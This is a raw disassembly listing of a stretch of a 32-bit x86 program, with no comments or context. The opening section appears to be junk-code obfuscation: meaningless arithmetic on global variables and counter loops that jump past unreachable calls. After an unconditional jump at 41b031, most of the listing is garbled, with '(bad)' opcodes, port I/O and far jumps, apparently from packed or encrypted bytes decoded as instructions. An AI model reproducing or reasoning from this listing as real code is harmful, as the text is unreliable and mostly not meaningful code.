  41aed8:	or     DWORD PTR ds:0x42a29e,0x157
  41aee2:	mov    edx,DWORD PTR [ebp+0x8]
  41aee5:	sub    ebx,DWORD PTR ds:0x42a2f2
  41aeeb:	mov    ebx,DWORD PTR [ebp-0x54]
  41aeee:	add    edx,0x64f898
  41aef4:	or     DWORD PTR ds:0x42a25a,0x5c58
  41aefe:	or     edx,ebx
  41af00:	mov    ebx,DWORD PTR ds:0x42a322
  41af06:	mov    ebx,DWORD PTR [ebx]
  41af08:	sbb    DWORD PTR ds:0x42a2ee,ebx
  41af0e:	mov    DWORD PTR [ebp-0x54],edx
  41af11:	movzx  edx,WORD PTR ds:0x42a2c2
  41af18:	sub    DWORD PTR ds:0x42a28e,edx
  41af1e:	mov    edx,DWORD PTR [ebp+0x8]
  41af21:	xor    ebx,DWORD PTR ds:0x42a28a
  41af27:	mov    ebx,DWORD PTR [ebp-0x50]
  41af2a:	adc    DWORD PTR ds:0x42a29a,0x42a2a6
  41af34:	add    edx,ecx
  41af36:	sbb    DWORD PTR ds:0x42a2f2,0x42a2de
  41af40:	xor    edx,ebx
  41af42:	or     DWORD PTR ds:0x42a2de,edx
  41af48:	mov    DWORD PTR [ebp-0x50],edx
  41af4b:	and    DWORD PTR ds:0x42a262,0x0
  41af55:	xor    edx,edx
  41af57:	xor    edx,DWORD PTR ds:0x42a262
  41af5d:	inc    edx
  41af5e:	mov    DWORD PTR ds:0x42a262,edx
  41af64:	cmp    DWORD PTR ds:0x42a262,0x5
  41af6b:	jbe    0x41afb0
  41af71:	jmp    0x41af87
  41af76:	push   0x1fcb
  41af7b:	push   DWORD PTR [ebp-0x28]
  41af7e:	push   DWORD PTR [ebp-0x24]
  41af81:	call   DWORD PTR ds:0x42a402
  41af87:	cmp    DWORD PTR ds:0x42a262,0x4
  41af8e:	jne    0x41afa3
  41af94:	xor    edx,edx
  41af96:	or     edx,DWORD PTR ds:0x42a262
  41af9c:	inc    edx
  41af9d:	mov    DWORD PTR ds:0x42a262,edx
  41afa3:	cmp    DWORD PTR ds:0x42a262,0x16
  41afaa:	jb     0x41af55
  41afb0:	mov    edx,DWORD PTR [ebp+0x8]
  41afb3:	and    DWORD PTR ds:0x42a2f2,0x0
  41afbd:	xor    ebx,ebx
  41afbf:	or     ebx,DWORD PTR ds:0x42a2f2
  41afc5:	inc    ebx
  41afc6:	mov    DWORD PTR ds:0x42a2f2,ebx
  41afcc:	cmp    DWORD PTR ds:0x42a2f2,0xb
  41afd3:	jl     0x41b024
  41afd9:	jmp    0x41affd
  41afde:	push   0x1
  41afe0:	push   DWORD PTR [ebp-0x10]
  41afe3:	push   0x5b88
  41afe8:	push   0x81d2
  41afed:	push   0x4421
  41aff2:	push   0x50f5
  41aff7:	call   DWORD PTR ds:0x42a3c2
  41affd:	cmp    DWORD PTR ds:0x42a2f2,0xa
  41b004:	jne    0x41b017
  41b00a:	mov    ebx,DWORD PTR ds:0x42a2f2
  41b010:	inc    ebx
  41b011:	mov    DWORD PTR ds:0x42a2f2,ebx
  41b017:	cmp    DWORD PTR ds:0x42a2f2,0x18
  41b01e:	jb     0x41afbd
  41b024:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b027:	adc    DWORD PTR ds:0x42a2f6,0x42a2e2
  41b031:	jmp    0x41d389
  41b036:	xchg   ebx,eax
  41b037:	jmp    0xab5b1b75
  41b03c:	add    DWORD PTR [ecx+0x1dcb2f48],0x7255a6a5
  41b046:	mov    bh,bh
  41b048:	jl     0x41afcd
  41b04a:	inc    esi
  41b04b:	pop    esi
  41b04c:	add    DWORD PTR [ebx+0x10cc3e25],0x41
  41b053:	out    0xcc,ax
  41b056:	push   0x3a
  41b058:	xchg   edx,eax
  41b059:	data16 loop 0x41b0cc
  41b05c:	sub    eax,DWORD PTR [ecx-0x394d8011]
  41b062:	fild   WORD PTR ds:0xe87ffa67
  41b068:	ja     0x41b047
  41b06a:	aas    
  41b06b:	and    al,0x73
  41b06d:	or     BYTE PTR [esi],cl
  41b06f:	adc    eax,0x55946edf
  41b074:	xchg   esp,eax
  41b075:	push   ss
  41b076:	sub    DWORD PTR [ebp+0x48],esp
  41b079:	sbb    edx,ebp
  41b07b:	stc    
  41b07c:	dec    esp
  41b07d:	dec    ecx
  41b07e:	sub    eax,0xb14fd9c7
  41b083:	(bad)  
  41b084:	cli    
  41b085:	dec    esp
  41b086:	pusha  
  41b087:	add    DWORD PTR [ecx],edx
  41b089:	mov    ds:0xb5ff225,al
  41b08e:	add    ecx,DWORD PTR [ecx]
  41b090:	jp     0x41b092
  41b092:	(bad)  
  41b093:	mov    ecx,0x663f1e85
  41b098:	push   ds
  41b099:	repnz cmp edx,DWORD PTR [edx-0x16]
  41b09d:	dec    ebp
  41b09e:	lock lods eax,DWORD PTR ds:[esi]
  41b0a0:	call   FWORD PTR [ebp+0x3174ef6e]
  41b0a6:	inc    ebx
  41b0a7:	jg     0x41b0c6
  41b0a9:	push   edi
  41b0aa:	out    dx,al
  41b0ab:	sub    al,BYTE PTR [edx]
  41b0ad:	ds data16 js 0x41b0f6
  41b0b1:	jl     0x41b0dc
  41b0b3:	push   0x5959e8
  41b0b8:	dec    ebx
  41b0b9:	daa    
  41b0ba:	test   BYTE PTR ds:0x65a33478,dh
  41b0c0:	(bad)  
  41b0c1:	push   esp
  41b0c2:	pop    eax
  41b0c3:	bound  ecx,QWORD PTR [esi+0x3252d13c]
  41b0c9:	fdivp  st(3),st
  41b0cb:	and    al,0x4b
  41b0cd:	(bad)
  41b0d0:	sub    al,0x46
  41b0d2:	jae    0x41b0a6
  41b0d4:	cwde   
  41b0d5:	and    DWORD PTR [eax],esi
  41b0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d8:	addr16 sub al,0xc5
  41b0db:	rol    ebp,1
  41b0dd:	dec    edi
  41b0de:	sbb    eax,0x58de06a0
  41b0e3:	mov    ah,0x6e
  41b0e5:	leave  
  41b0e6:	inc    edi
  41b0e7:	outs   dx,DWORD PTR ds:[esi]
  41b0e8:	dec    esp
  41b0e9:	ins    BYTE PTR es:[edi],dx
  41b0ea:	xchg   BYTE PTR [edx-0x20],bl
  41b0ed:	loope  0x41b084
  41b0ef:	hlt    
  41b0f0:	fisttp WORD PTR [edx-0x61f2836e]
  41b0f6:	push   ss
  41b0f7:	fcom   DWORD PTR [esi-0x2c]
  41b0fa:	icebp  
  41b0fb:	add    BYTE PTR [ecx],cl
  41b0fd:	sub    bl,dl
  41b0ff:	adc    BYTE PTR [eax+0x36],dh
  41b102:	les    ebp,FWORD PTR [esi+0xc]
  41b105:	sub    DWORD PTR [ebx-0x4409a00f],ebp
  41b10b:	inc    esp
  41b10c:	shl    BYTE PTR [esi-0x22],1
  41b10f:	mov    bl,0xe0
  41b111:	add    al,0xbd
  41b113:	push   edx
  41b114:	pop    ecx
  41b115:	and    eax,0xad017c5d
  41b11a:	jp     0x41b115
  41b11c:	jmp    0x41b15d
  41b11e:	in     al,0x73
  41b120:	or     eax,ebx
  41b122:	js     0x41b0a7
  41b124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b125:	dec    edi
  41b126:	lods   eax,DWORD PTR ds:[esi]
  41b127:	aas    
  41b128:	outs   dx,BYTE PTR ds:[esi]
  41b129:	fild   DWORD PTR [edx+0x5f]
  41b12c:	fnsave [edi+eiz*4-0x414b6558]
  41b133:	pop    eax
  41b134:	sub    eax,0x7f21c618
  41b139:	sbb    BYTE PTR ds:0xa15f35c8,bh
  41b13f:	sbb    edi,DWORD PTR [ecx]
  41b141:	jl     0x41b182
  41b143:	nop
  41b144:	lea    edi,[ecx-0x7a039340]
  41b14a:	pusha  
  41b14b:	dec    ecx
  41b14c:	icebp  
  41b14d:	lods   eax,DWORD PTR ds:[esi]
  41b14e:	inc    ecx
  41b14f:	int    0x25
  41b151:	ret    
  41b152:	(bad)  
  41b154:	dec    esp
  41b155:	and    eax,0x214d439e
  41b15a:	xchg   BYTE PTR ds:[ebx],bh
  41b15d:	or     al,0x26
  41b15f:	int3   
  41b160:	xchg   edx,eax
  41b161:	mov    edi,DWORD PTR [esi+edi*4+0x478a1395]
  41b168:	push   ss
  41b169:	mov    ch,0x5a
  41b16b:	mov    al,BYTE PTR [eax+edi*4]
  41b16e:	pop    esp
  41b16f:	and    eax,0x665425e6
  41b174:	xchg   BYTE PTR [ecx+0x216164f1],ch
  41b17a:	push   ebp
  41b17b:	jmp    0x41b1c7
  41b17d:	test   al,bh
  41b17f:	mov    ah,0x18
  41b181:	push   0x5d369b77
  41b186:	pop    eax
  41b187:	jl     0x41b1d7
  41b189:	inc    edi
  41b18a:	dec    edx
  41b18b:	mov    ch,0xf4
  41b18d:	in     al,0x50
  41b18f:	data16 scas al,BYTE PTR es:[edi]
  41b191:	aam    0x94
  41b193:	jae    0x41b1f8
  41b195:	cmp    BYTE PTR [edi-0x80],bh
  41b198:	xor    ebp,DWORD PTR [ecx-0x48a52c6a]
  41b19e:	jl     0x41b187
  41b1a0:	mov    WORD PTR [esi-0x3de595b1],?
  41b1a6:	push   edx
  41b1a7:	push   ss
  41b1a8:	das    
  41b1a9:	inc    ebx
  41b1aa:	fwait
  41b1ab:	popf   
  41b1ac:	repz out 0xae,al
  41b1af:	mov    dl,0xe8
  41b1b1:	sbb    al,0x3a
  41b1b3:	pop    ecx
  41b1b4:	xchg   ebp,eax
  41b1b5:	aaa    
  41b1b6:	retf   0xd77c
  41b1b9:	shl    DWORD PTR [ecx+0x8ec1206],0xc8
  41b1c0:	mov    al,0x1
  41b1c2:	mov    ch,0x29
  41b1c4:	cmp    DWORD PTR [ecx-0x7c],esi
  41b1c7:	es xor al,0xa3
  41b1ca:	popf   
  41b1cb:	ds ins BYTE PTR es:[edi],dx
  41b1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ce:	aaa    
  41b1cf:	fisub  WORD PTR [ebp-0x28]
  41b1d2:	mov    ebx,0xc575b422
  41b1d7:	fs mov ah,0xe7
  41b1da:	sbb    al,0x49
  41b1dc:	cmp    DWORD PTR [edi],0x32b1b949
  41b1e2:	daa    
  41b1e3:	cwde   
  41b1e4:	adc    eax,0x53878f27
  41b1e9:	cs inc edx
  41b1eb:	ret    
  41b1ec:	xor    eax,0xe9c53051
  41b1f1:	(bad)  
  41b1f2:	sbb    ebx,DWORD PTR [ebp+0x1f]
  41b1f5:	outs   dx,BYTE PTR ds:[esi]
  41b1f6:	pop    ds
  41b1f7:	into   
  41b1f8:	daa    
  41b1f9:	mov    ch,bh
  41b1fb:	adc    al,0x23
  41b1fd:	fs mov edi,0xf051c8ec
  41b203:	sbb    al,0x80
  41b205:	loop   0x41b23c
  41b207:	mov    edx,0xb691616
  41b20c:	add    bh,BYTE PTR [esi]
  41b20e:	retf   0xb728
  41b211:	popa   
  41b212:	mov    bh,0xa
  41b214:	pop    edi
  41b215:	add    DWORD PTR [edx+0x55],0xe
  41b219:	push   ds
  41b21a:	push   eax
  41b21b:	inc    eax
  41b21c:	inc    eax
  41b21d:	sbb    bh,al
  41b21f:	aaa    
  41b220:	shr    BYTE PTR [edx+0x75],0x78
  41b224:	(bad)  
  41b225:	fcomp  st(4)
  41b227:	sub    DWORD PTR [eax],ebx
  41b229:	or     DWORD PTR [ecx+0x2c98fd99],ebp
  41b22f:	ja     0x41b1f1
  41b231:	pop    ebp
  41b232:	or     BYTE PTR [ecx],al
  41b234:	mov    BYTE PTR [ebx],bh
  41b236:	jge    0x41b2a9
  41b238:	cld    
  41b239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b23a:	ja     0x41b1f3
  41b23c:	mov    dl,BYTE PTR [esp-0xa]
  41b240:	mov    eax,0x74ab7d4
  41b245:	push   esi
  41b246:	add    DWORD PTR [eax+edi*2-0x1e02ddfd],esp
  41b24d:	dec    ebx
  41b24e:	cmc    
  41b24f:	ror    esi,0xdf
  41b252:	xlat   BYTE PTR ds:[ebx]
  41b253:	push   edi
  41b254:	cmp    DWORD PTR [ebp+0x20e48cd6],edi
  41b25a:	adc    DWORD PTR fs:[esi+0x40],ebx
  41b25e:	xor    DWORD PTR [edi],0xffffffe7
  41b261:	dec    esi
  41b262:	mov    al,ds:0x1de30c09
  41b267:	popf   
  41b268:	loope  0x41b22e
  41b26a:	push   edx
  41b26b:	push   ss
  41b26c:	out    0xcd,al
  41b26e:	popf   
  41b26f:	ficom  WORD PTR [edi-0x6c]
  41b272:	jecxz  0x41b2cc
  41b274:	stc    
  41b275:	mov    eax,gs:0xdf079c43
  41b27b:	mov    ebp,ecx
  41b27d:	push   cs
  41b27e:	mov    bl,0xc3
  41b280:	rcl    esp,cl
  41b282:	and    ebx,DWORD PTR [ebx-0x36fb6b88]
  41b288:	leave  
  41b289:	pushf  
  41b28a:	dec    ebp
  41b28b:	repnz loopne 0x41b22d
  41b28e:	sbb    esp,DWORD PTR [esi+0x65d907ca]
  41b294:	cld    
  41b295:	cld    
  41b296:	dec    esp
  41b297:	jae    0x41b224
  41b299:	fcomp  st(3)
  41b29b:	push   cs
  41b29c:	xor    BYTE PTR [edi+0x4e],dl
  41b29f:	add    ebx,DWORD PTR [esi-0x11]
  41b2a2:	dec    ebx
  41b2a3:	inc    esp
  41b2a4:	pop    edi
  41b2a5:	aad    0x1c
  41b2a7:	jp     0x41b24c
  41b2a9:	repnz test al,0x68
  41b2ac:	dec    esp
  41b2ad:	fstp   TBYTE PTR [edi+edx*2+0x71]
  41b2b1:	(bad)  
  41b2b2:	mov    esi,0x8f0947a5
  41b2b7:	es je  0x41b264
  41b2ba:	inc    edx
  41b2bb:	neg    DWORD PTR [ebx]
  41b2bd:	ins    DWORD PTR es:[edi],dx
  41b2be:	out    dx,eax
  41b2bf:	xchg   BYTE PTR [esi-0x219d0bdf],dl
  41b2c5:	push   ecx
  41b2c6:	mov    edi,0xffb222b3
  41b2cb:	or     edx,DWORD PTR [eax+0x6c7be9f5]
  41b2d1:	cdq    
  41b2d2:	(bad)  
  41b2d3:	mov    ?,WORD PTR [edi+0x589521f7]
  41b2d9:	aad    0xec
  41b2db:	icebp  
  41b2dc:	in     eax,dx
  41b2dd:	mov    WORD PTR [eax-0x3baa5a61],?
  41b2e3:	push   esp
  41b2e4:	mov    eax,ds:0xac0a8274
  41b2e9:	jg     0x41b2a9
  41b2eb:	jns    0x41b26f
  41b2ed:	mov    dh,0xd8
  41b2ef:	test   al,0x1c
  41b2f1:	clc    
  41b2f2:	sub    DWORD PTR [ebp+0x67],esp
  41b2f5:	retf   
  41b2f6:	xchg   edx,esi
  41b2f8:	adc    BYTE PTR [edx+ebx*1-0xd2bff3d],dh
  41b2ff:	ret    
  41b300:	popf   
  41b301:	icebp  
  41b302:	rcr    DWORD PTR [edx+0x3e],1
  41b305:	and    cl,BYTE PTR [edi+0x8df9908]
  41b30b:	clc    
  41b30c:	popf   
  41b30d:	sub    ebx,eax
  41b30f:	cmp    esp,ecx
  41b311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b312:	xlat   BYTE PTR ds:[ebx]
  41b313:	push   0x45
  41b315:	in     eax,0x5e
  41b317:	in     al,0x75
  41b319:	jmp    0x41b339
  41b31b:	jae    0x41b2f4
  41b31d:	js     0x41b2d6
  41b31f:	xor    cl,bh
  41b321:	push   edi
  41b322:	push   ecx
  41b323:	sub    dl,bl
  41b325:	bound  edi,QWORD PTR [esi+0x3f]
  41b328:	add    DWORD PTR [eax],esp
  41b32a:	cmp    esi,DWORD PTR [ebx+0x56]
  41b32d:	fisttp WORD PTR [ebp-0x40]
  41b330:	mov    ch,0x83
  41b332:	xlat   BYTE PTR ds:[ebx]
  41b333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b334:	jmp    0x15234b6b
  41b339:	pushf  
  41b33a:	loope  0x41b389
  41b33c:	push   cs
  41b33d:	imul   eax,ebx,0x48
  41b340:	or     al,0x7b
  41b342:	jb     0x41b39f
  41b344:	or     ebp,DWORD PTR [ecx]
  41b346:	test   DWORD PTR ds:0x79cb90de,ecx
  41b34c:	rcr    BYTE PTR ds:0x24ac67d3,0xef
  41b353:	push   edi
  41b354:	test   al,0xb9
  41b356:	mov    ds,WORD PTR [edx+0x17b64556]
  41b35c:	or     edx,DWORD PTR [edx+0x73]
  41b35f:	pop    ds
  41b360:	push   esi
  41b361:	inc    esi
  41b363:	or     ah,BYTE PTR [ecx-0x54645aeb]
  41b369:	xor    al,BYTE PTR [eax]
  41b36b:	xchg   ecx,eax
  41b36c:	shl    BYTE PTR [ecx],cl
  41b36e:	aad    0x98
  41b370:	dec    edx
  41b371:	pop    ebp
  41b372:	jmp    0x1f31:0xeca75380
  41b379:	fnsave [edi+0x2c]
  41b37c:	fisub  WORD PTR [ecx+0x17]
  41b37f:	mov    WORD PTR [esi],gs
  41b381:	adc    eax,0x79df1c8d
  41b386:	pop    DWORD PTR [eax+0x3c51128]
  41b38c:	shl    BYTE PTR [ebx],0x69
  41b38f:	neg    BYTE PTR [eax-0x5e]
  41b392:	mov    WORD PTR [ecx+0x106dedc0],es
  41b398:	push   esp
  41b399:	jmp    0x93f9:0xad5aa0c9
  41b3a0:	iret   
  41b3a1:	mov    ds:0xa883fd78,eax
  41b3a6:	popf   
  41b3a7:	mov    eax,0xce3f6129
  41b3ac:	pop    eax
  41b3ad:	push   esi
  41b3ae:	and    BYTE PTR [eax+0x1274fc9f],dl
  41b3b4:	test   eax,0xbb5533ab
  41b3b9:	adc    esi,DWORD PTR [ebx-0x32]
  41b3bc:	out    dx,eax
  41b3bd:	mov    esp,0xde694c8c
  41b3c2:	or     eax,0xd3af93e6
  41b3c7:	push   cs
  41b3c8:	dec    esi
  41b3c9:	pop    edx
  41b3ca:	pusha  
  41b3cb:	lea    edi,[edi-0x781f48e0]
  41b3d1:	cmp    eax,0xb1328b03
  41b3d6:	mov    ah,0xeb
  41b3d8:	xchg   edi,eax
  41b3d9:	dec    esi
  41b3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3db:	js     0x41b3e6
  41b3dd:	sbb    DWORD PTR [esi-0x1fd275eb],eax
  41b3e3:	std    
  41b3e4:	xchg   cl,dh
  41b3e6:	mov    eax,ds:0x46f053cd
  41b3eb:	push   ss
  41b3ec:	pop    edx
  41b3ed:	mov    eax,0xe45906df
  41b3f2:	outs   dx,BYTE PTR ds:[esi]
  41b3f3:	jge    0x41b3b9
  41b3f5:	sahf   
  41b3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3f7:	mov    gs,WORD PTR [edi+0x52]
  41b3fa:	dec    esp
  41b3fb:	in     al,0xac
  41b3fd:	push   ebp
  41b3fe:	out    0x5c,eax
  41b400:	inc    eax
  41b401:	jmp    0xccd4:0x83d4be39
  41b408:	jns    0x41b3b0
  41b40a:	out    dx,eax
  41b40b:	add    eax,0x2c35efc2
  41b410:	inc    edx
  41b411:	mov    dl,0x76
  41b413:	leave  
  41b414:	jmp    0x935f:0x801f3c3d
  41b41b:	out    dx,eax
  41b41c:	lock mov ?,WORD PTR [edx]
  41b41f:	stos   BYTE PTR es:[edi],al
  41b420:	sbb    BYTE PTR [eax],al
  41b422:	aad    0x56
  41b424:	popa   
  41b425:	pusha  
  41b426:	ret    
  41b427:	adc    BYTE PTR [ecx-0x5410bc6f],bh
  41b42d:	adc    al,bl
  41b42f:	adc    eax,0x9c55c567
  41b434:	dec    ebp
  41b435:	adc    eax,0x4910ecf2
  41b43a:	xchg   edx,eax
  41b43b:	jmp    0x41b48b
  41b43d:	pop    esp
  41b43e:	sub    cl,bl
  41b440:	add    ecx,DWORD PTR [edi-0x32bece83]
  41b446:	(bad)
  41b449:	dec    esp
  41b44a:	add    ebx,eax
  41b44c:	push   ebp
  41b44d:	test   eax,0xf86ac990
  41b452:	loop   0x41b408
  41b454:	lea    edi,[edi]
  41b456:	in     al,0x5a
  41b458:	loop   0x41b417
  41b45a:	inc    esp
  41b45b:	gs loope 0x41b409
  41b45e:	mov    ebp,0x3215e00f
  41b463:	xchg   ecx,eax
  41b464:	add    dh,BYTE PTR [esi+0x9eb4460]
  41b46a:	ror    BYTE PTR [esi-0x79c97f8b],0x24
  41b471:	rcl    ebx,0xd4
  41b474:	outs   dx,BYTE PTR ds:[esi]
  41b475:	dec    edi
  41b476:	test   eax,0x570211b4
  41b47b:	clc    
  41b47c:	or     al,bh
  41b47e:	adc    eax,0x5269c9e5
  41b483:	sbb    DWORD PTR [eax-0x5b50c56e],edx
  41b489:	popa   
  41b48a:	ins    DWORD PTR es:[edi],dx
  41b48b:	push   cs
  41b48c:	clc    
  41b48d:	jg     0x41b4ae
  41b48f:	xor    BYTE PTR [esi],al
  41b491:	mov    dh,0x7c
  41b493:	xchg   esi,eax
  41b494:	loope  0x41b41f
  41b496:	retf   0x82ff
  41b499:	(bad)  
  41b49a:	retf   
  41b49b:	xor    edi,ebx
  41b49d:	popa   
  41b49e:	dec    edi
  41b49f:	adc    DWORD PTR [ebx],edx
  41b4a1:	clc    
  41b4a2:	je     0x41b4fa
  41b4a4:	pop    es
  41b4a5:	cmp    eax,0x8cc3b08e
  41b4aa:	adc    BYTE PTR [esi-0x5670dbe7],0x14
  41b4b1:	lods   al,BYTE PTR ds:[esi]
  41b4b2:	(bad)  
  41b4b3:	mov    ds:0xac509303,al
  41b4b8:	mov    al,0xd8
  41b4ba:	sub    ah,BYTE PTR [ebp-0x75d6f8e3]
  41b4c0:	jmp    0x6be28ab1
  41b4c5:	pop    ebx
  41b4c6:	pop    ebx
  41b4c7:	push   esp
  41b4c8:	imul   edx,DWORD PTR [ecx+edx*8+0x27eca84],0xffffffdd
  41b4d0:	es in  al,0xf7
  41b4d3:	sub    ch,BYTE PTR [ebp+0x435ee6fd]
  41b4d9:	sar    bh,1
  41b4db:	xchg   DWORD PTR [ebp+ebx*4-0x603f9d74],edi
  41b4e2:	mov    esi,0x1219a136
  41b4e7:	mov    WORD PTR [ecx],cs
  41b4e9:	loop   0x41b496
  41b4eb:	loope  0x41b4f5
  41b4ed:	pop    esi
  41b4ee:	dec    edi
  41b4ef:	inc    ax
  41b4f1:	pop    ecx
  41b4f2:	jg     0x41b512
  41b4f4:	or     cl,BYTE PTR [ecx+0x40]
  41b4f7:	pop    ds
  41b4f8:	(bad)  
  41b4f9:	(bad)  
  41b4fa:	stos   BYTE PTR es:[edi],al
  41b4fb:	xor    bl,BYTE PTR [ecx]
  41b4fd:	mov    al,BYTE PTR [ecx-0x4ebd6832]
  41b503:	ja     0x41b540
  41b505:	mov    ds:0xdbfa65ea,al
  41b50a:	push   ecx
  41b50b:	repz dec ebp
  41b50d:	and    eax,0xd7d7abae
  41b512:	lods   eax,DWORD PTR ds:[esi]
  41b513:	and    al,0xcb
  41b515:	stos   DWORD PTR es:[edi],eax
  41b516:	nop
  41b517:	dec    edx
  41b518:	xchg   esi,ecx
  41b51a:	ret    0xbb30
  41b51d:	stos   BYTE PTR es:[edi],al
  41b51e:	shr    BYTE PTR [edx],0x53
  41b521:	leave  
  41b522:	fbstp  TBYTE PTR [ecx-0x7e9db1f7]
  41b528:	fbld   TBYTE PTR [edi]
  41b52a:	dec    esp
  41b52b:	imul   edi
  41b52d:	add    al,0x46
  41b52f:	mov    bl,0xed
  41b531:	xor    DWORD PTR [ecx+0x2f],ebp
  41b534:	push   ecx
  41b535:	ss sub ebp,esi
  41b538:	pop    ds
  41b539:	fs pop edx
  41b53b:	imul   ebx,DWORD PTR [edx-0x2a21bfe4],0x5e01b2b
  41b545:	mov    cl,0x55
  41b547:	(bad)  ds:0xac6caa84
  41b54d:	rol    BYTE PTR [ebp-0x5f4adf1a],cl
  41b553:	or     DWORD PTR [edx+esi*8-0x6679d4e0],eax
  41b55a:	xchg   DWORD PTR [esi],eax
  41b55c:	adc    al,dl
  41b55e:	jns    0x41b543
  41b560:	xchg   edx,eax
  41b561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b562:	mov    edx,DWORD PTR [edi+0x5d]
  41b565:	test   DWORD PTR [ebp-0x53],esp
  41b568:	xchg   edx,eax
  41b569:	pusha  
  41b56a:	mov    edi,0xf1c97774
  41b56f:	sbb    edx,DWORD PTR [ebx]
  41b571:	mov    ah,BYTE PTR [ecx]
  41b573:	ds jmp 0xf5c5:0xcc4a5cb2
  41b57b:	imul   eax,DWORD PTR [edi-0x24],0xfffffffe
  41b57f:	cmc    
  41b580:	(bad)  
  41b581:	hlt    
  41b582:	jl     0x41b601
  41b584:	imul   esi,DWORD PTR [esi+0x30d9bc44],0x23f1010c
  41b58e:	sub    dh,BYTE PTR [eax]
  41b590:	loop   0x41b561
  41b592:	jmp    0x1d74aa84
  41b597:	loop   0x41b51e
  41b599:	or     esi,ebp
  41b59b:	aas    
  41b59c:	jae    0x41b5c7
  41b59e:	fwait
  41b59f:	cmp    eax,0xfee48a79
  41b5a4:	or     edx,edx
  41b5a6:	test   BYTE PTR [esi+0x3d],al
  41b5a9:	cmp    ebx,ebx
  41b5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ac:	push   edi
  41b5ad:	ror    DWORD PTR [ebp-0x4d],1
  41b5b0:	mov    cl,0x47
  41b5b2:	mov    dl,0xd7
  41b5b4:	and    al,0xac
  41b5b6:	sub    DWORD PTR [ebp-0x43],edi
  41b5b9:	dec    edx
  41b5ba:	add    cl,BYTE PTR [ecx+0x3a6dae6]
  41b5c0:	imul   ebx,DWORD PTR ds:0xc647a199,0xffffff92
  41b5c7:	inc    edx
  41b5c8:	cmp    BYTE PTR [ecx-0x3a],ah
  41b5cb:	or     esp,DWORD PTR [ebx+ebx*1]
  41b5ce:	push   esp
  41b5cf:	pop    ss
  41b5d0:	retf   0xd1e1
  41b5d3:	mov    DWORD PTR ds:0x7aedcb8e,0xe7027829
  41b5dd:	(bad)  [edx]
  41b5df:	mov    eax,0xaeb3bd1e
  41b5e4:	mov    edx,DWORD PTR [eax]
  41b5e6:	mov    ecx,0x7c66ee20
  41b5eb:	std    
  41b5ec:	es dec ebx
  41b5ee:	jb     0x41b5e2
  41b5f0:	and    eax,0x1ad90327
  41b5f5:	jle    0x41b59e
  41b5f7:	cmp    BYTE PTR [edx+0xe07807a],bh
  41b5fd:	sub    ecx,DWORD PTR [eax-0x1f60c65d]
  41b603:	push   esi
  41b604:	push   0xffffffc9
  41b606:	nop
  41b607:	sub    bl,BYTE PTR [esi-0xd7c1938]
  41b60d:	mov    bh,0x96
  41b60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b610:	in     al,dx
  41b611:	inc    ebp
  41b612:	jne    0x41b5fc
  41b614:	jae    0x41b64d
  41b616:	push   es
  41b617:	test   al,0x17
  41b619:	arpl   cx,di
  41b61b:	xchg   esp,eax
  41b61c:	ret    
  41b61d:	xchg   ecx,eax
  41b61e:	xor    BYTE PTR [esi-0x60bccda9],dl
  41b624:	mov    ds:0x203fcbb5,al
  41b629:	cld    
  41b62a:	sbb    dl,0x9
  41b62d:	test   BYTE PTR [esi],ah
  41b62f:	ins    BYTE PTR es:[edi],dx
  41b630:	push   esi
  41b631:	sti    
  41b632:	cs (bad) 
  41b634:	jmp    0x41b681
  41b636:	push   esp
  41b637:	push   bp
  41b639:	cld    
  41b63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b63b:	mov    ch,0x4a
  41b63d:	mov    ah,0xa2
  41b63f:	shl    BYTE PTR [ecx+eax*4+0x3d],0x83
  41b644:	bound  eax,QWORD PTR [ebx-0x22]
  41b647:	fidivr DWORD PTR [ecx-0x674e1ead]
  41b64d:	xchg   edi,eax
  41b64e:	adc    esi,DWORD PTR [ebx+0x19]
  41b651:	xchg   BYTE PTR [ecx+0x559f5829],al
  41b657:	ret    0xa533
  41b65a:	aam    0xd9
  41b65c:	or     al,BYTE PTR [esi+eiz*8]
  41b65f:	retf   
  41b660:	jnp    0x41b645
  41b662:	jb     0x41b670
  41b664:	cdq    
  41b665:	mov    edi,0xffe2612c
  41b66a:	inc    edi
  41b66b:	mov    ds:0xcf36c7dc,al
  41b670:	adc    eax,0x4bc94ff4
  41b675:	xor    eax,ebp
  41b677:	xchg   esi,eax
  41b678:	cmp    al,0x63
  41b67a:	inc    ebx
  41b67b:	in     eax,0xe2
  41b67d:	add    eax,0xf6e02123
  41b682:	es leave 
  41b684:	xor    bl,BYTE PTR [ebx+0x208788da]
  41b68a:	jno    0x41b6c2
  41b68c:	iret   
  41b68d:	xchg   BYTE PTR [esi-0x44],ah
  41b690:	xchg   edi,eax
  41b691:	mov    ebx,0x472cde09
  41b696:	cmp    al,0xd5
  41b698:	cld    
  41b699:	clc    
  41b69a:	xor    edx,0xffffffe0
  41b69d:	dec    ebx
  41b69e:	std    
  41b69f:	dec    eax
  41b6a0:	mov    edi,0x3383d6b4
  41b6a5:	sbb    al,0xd
  41b6a7:	pop    esp
  41b6a8:	or     al,0x9c
  41b6aa:	or     edi,ebp
  41b6ac:	sub    al,0x2e
  41b6ae:	jae    0x41b6f1
  41b6b0:	mov    ah,0x3c
  41b6b2:	and    ah,BYTE PTR [ecx+0x57]
  41b6b5:	mov    esp,esi
  41b6b7:	aaa    
  41b6b8:	cmp    BYTE PTR [ebx],0x47
  41b6bb:	jmp    eax
  41b6bd:	push   edi
  41b6be:	js     0x41b6e5
  41b6c0:	xchg   ebx,eax
  41b6c1:	mov    ecx,0xa63ed336
  41b6c6:	adc    edx,DWORD PTR [ecx-0x2467fcf0]
  41b6cc:	or     BYTE PTR [esi-0x1f],0x52
  41b6d0:	jb     0x41b6f7
  41b6d2:	cs push eax
  41b6d4:	ins    BYTE PTR es:[edi],dx
  41b6d5:	mov    eax,edi
  41b6d7:	dec    edi
